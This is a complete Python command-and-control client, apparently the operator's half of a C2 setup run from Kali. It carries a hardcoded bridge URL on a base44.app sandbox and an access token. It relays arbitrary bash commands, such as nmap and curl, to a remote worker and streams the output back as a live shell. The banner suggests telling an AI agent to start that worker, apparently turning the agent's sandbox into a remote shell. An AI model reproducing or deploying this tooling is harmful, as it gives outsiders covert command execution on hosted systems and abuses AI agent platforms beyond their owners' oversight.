#!/usr/bin/env python3
"""
C2 Streaming Shell - Kali Side
Single tool: connects to sandbox via c2Bridge, gives live interactive shell.
Output streams in real-time (400ms polling = near-instant).

Usage:
  python3 kali_c2.py
  python3 kali_c2.py --url https://elio-acd17217.base44.app/functions/c2Bridge

Install dependency: pip3 install requests
"""

import requests
import sys
import os
import time
import json
import signal

# ════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════
BRIDGE_URL = "https://elio-acd17217.base44.app/functions/c2Bridge"
TOKEN = "shadow-core-c2-bridge-2026"
POLL_INTERVAL = 0.4  # 400ms for near-real-time

# Colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

class C2Shell:
    def __init__(self, url=BRIDGE_URL):
        self.url = url
        self.token = TOKEN
        self.running = True
        self.current_cmd_id = None
        self.output_offset = 0
        
    def api(self, method, payload=None, params=None):
        """Call the c2Bridge API"""
        try:
            full_params = {"token": self.token}
            if params:
                full_params.update(params)
                
            if method == "GET":
                r = requests.get(self.url, params=full_params, timeout=10)
            elif method == "POST":
                data = {**(payload or {}), "token": self.token}
                r = requests.post(self.url, json=data, timeout=10)
            elif method == "PUT":
                data = {**(payload or {}), "token": self.token}
                r = requests.put(self.url, json=data, timeout=10)
            return r.json()
        except Exception as e:
            return {"error": str(e)}
    
    def send_command(self, command):
        """Send a command to sandbox"""
        self.output_offset = 0
        result = self.api("POST", {"command": command})
        if "error" in result:
            print(f"{RED}[!] Error: {result['error']}{RESET}")
            return False
        self.current_cmd_id = result.get("id")
        return True
    
    def poll_output(self):
        """Poll for new output from current command"""
        if not self.current_cmd_id:
            return None
        
        result = self.api("GET", params={"id": self.current_cmd_id})
        if "error" in result:
            return None
        
        output = result.get("output", "")
        status = result.get("status", "")
        
        # Only show new output (after our offset)
        if len(output) > self.output_offset:
            new_data = output[self.output_offset:]
            self.output_offset = len(output)
            return new_data, status
        
        return "", status
    
    def check_worker(self):
        """Check if sandbox worker is responsive"""
        result = self.api("GET")
        if "error" not in result:
            return True
        return False
    
    def wait_for_command(self, cmd):
        """Send command and stream output until completion"""
        if not self.send_command(cmd):
            return
        
        spinner = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
        spin_idx = 0
        last_output_time = time.time()
        
        while True:
            result = self.poll_output()
            if result is None:
                print(f"{RED}[!] Connection error{RESET}")
                break
            
            new_output, status = result
            
            if new_output:
                sys.stdout.write(new_output)
                sys.stdout.flush()
                last_output_time = time.time()
            
            if status in ("completed", "error"):
                break
            
            # Show spinner if no output for a while
            if time.time() - last_output_time > 2:
                sys.stdout.write(f"\r{DIM}{spinner[spin_idx % len(spinner)]} executing...{RESET}")
                sys.stdout.flush()
                spin_idx += 1
            
            time.sleep(POLL_INTERVAL)
        
        # Clear spinner
        if spin_idx > 0:
            sys.stdout.write(f"\r{' ' * 30}\r")
            sys.stdout.flush()
        
        self.current_cmd_id = None
        print()
    
    def banner(self):
        os.system("clear" if os.name != "nt" else "cls")
        print(f"{CYAN}{BOLD}")
        print("╔════════════════════════════════════════════════════════╗")
        print("║          C2 STREAMING SHELL → Base44 Sandbox          ║")
        print("╠════════════════════════════════════════════════════════╣")
        print(f"║  Bridge: {self.url[:42]:<42}  ║")
        print(f"║  Poll:   {str(POLL_INTERVAL*1000)+'ms':<44}  ║")
        print("║  Mode:   Streaming (near real-time)                   ║")
        print("╚════════════════════════════════════════════════════════╝")
        print(f"{RESET}")
        
        # Check worker
        if self.check_worker():
            print(f"{GREEN}[+] Sandbox worker: ONLINE{RESET}")
        else:
            print(f"{RED}[!] Sandbox worker: OFFLINE{RESET}")
            print(f"{YELLOW}    Tell the agent: 'شغل الـ worker'{RESET}")
        
        print(f"\n{GREEN}[+] Ready! Type commands below.{RESET}")
        print(f"{DIM}    exit/quit | clear | status | help{RESET}\n")
    
    def run(self):
        self.banner()
        
        while self.running:
            try:
                prompt = f"{GREEN}sandbox{RESET}@{CYAN}c2{RESET}:~$ "
                cmd = input(prompt)
                cmd = cmd.strip()
                
                if not cmd:
                    continue
                
                if cmd.lower() in ("exit", "quit"):
                    break
                
                if cmd.lower() == "clear":
                    os.system("clear" if os.name != "nt" else "cls")
                    continue
                
                if cmd.lower() == "status":
                    alive = self.check_worker()
                    print(f"{GREEN if alive else RED}[Worker: {'ONLINE' if alive else 'OFFLINE'}]{RESET}")
                    continue
                
                if cmd.lower() == "help":
                    print(f"""
{BOLD}C2 Shell Commands:{RESET}
  {CYAN}exit/quit{RESET}  - Disconnect
  {CYAN}clear{RESET}    - Clear screen
  {CYAN}status{RESET}   - Check worker status
  {CYAN}help{RESET}     - This message

{BOLD}Sandbox Commands:{RESET}
  Any bash command runs on the sandbox:
  whoami, uname -a, nmap, python3, curl, dig, etc.
""")
                    continue
                
                self.wait_for_command(cmd)
                
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[*] Use 'exit' to quit{RESET}")
            except EOFError:
                break
        
        self.running = False
        print(f"{YELLOW}[*] Goodbye!{RESET}")


if __name__ == "__main__":
    url = BRIDGE_URL
    if "--url" in sys.argv:
        idx = sys.argv.index("--url")
        if idx + 1 < len(sys.argv):
            url = sys.argv[idx + 1]
    
    shell = C2Shell(url)
    
    def sigint_handler(sig, frame):
        shell.running = False
        print(f"\n{YELLOW}[*] Shutting down...{RESET}")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, sigint_handler)
    shell.run()
